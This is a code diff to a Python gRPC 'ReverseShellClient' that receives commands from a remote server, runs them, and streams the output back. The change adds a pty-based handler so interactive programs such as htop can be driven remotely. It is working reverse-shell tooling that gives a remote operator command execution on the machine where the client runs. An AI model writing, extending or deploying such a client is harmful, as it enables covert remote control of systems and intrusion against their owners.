@@ -4,6 +4,8 @@ import reverse_shell_pb2_grpc
 import subprocess
 import asyncio
 import logging
+import os
+import pty
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', handlers=[logging.StreamHandler()])
 
@@ -91,6 +93,8 @@ class ReverseShellClient:
                 )
                 async for _ in self.stub.StreamResponses(iter([directory_change_response])):
                     logging.info(f"Sent directory change response to server: {self.current_directory}")
+            elif command == "htop":
+                await self.execute_htop(command, request_id)
             else:
                 async for output in self.execute_command(command):
                     response = reverse_shell_pb2.CommandResponse(
@@ -110,6 +114,44 @@ class ReverseShellClient:
             )
             self.stub.StreamResponses(iter([final_response]))
             logging.info("Command processing finished.")
+
+    async def execute_htop(self, command, request_id):
+        logging.info(f"Executing htop command.")
+        
+        master_fd, slave_fd = pty.openpty()
+        self.current_process = await asyncio.create_subprocess_exec(
+            command,
+            stdin=slave_fd,
+            stdout=slave_fd,
+            stderr=slave_fd,
+            close_fds=True
+        )
+
+        os.close(slave_fd)
+        
+        try:
+            while not self.stop_event.is_set():
+                output = await asyncio.to_thread(os.read, master_fd, 1024)
+                if not output:
+                    break
+                decoded_output = output.decode(errors='ignore')
+                logging.info(f"htop output: {decoded_output.strip()}")
+
+                response = reverse_shell_pb2.CommandResponse(
+                    request_id=request_id,
+                    output=decoded_output,
+                    is_active=True
+                )
+                async for _ in self.stub.StreamResponses(iter([response])):
+                    logging.info(f"Sent htop output to server.")
+        finally:
+            os.close(master_fd)
+            if self.current_process:
+                if self.current_process.returncode is None:
+                    self.current_process.terminate()
+                    await self.current_process.wait()
+                self.current_process = None
+            logging.info("htop process terminated.")
 
     async def execute_command(self, command, timeout=30):
         logging.info(f"Executing command in directory {self.current_directory}: {command}")
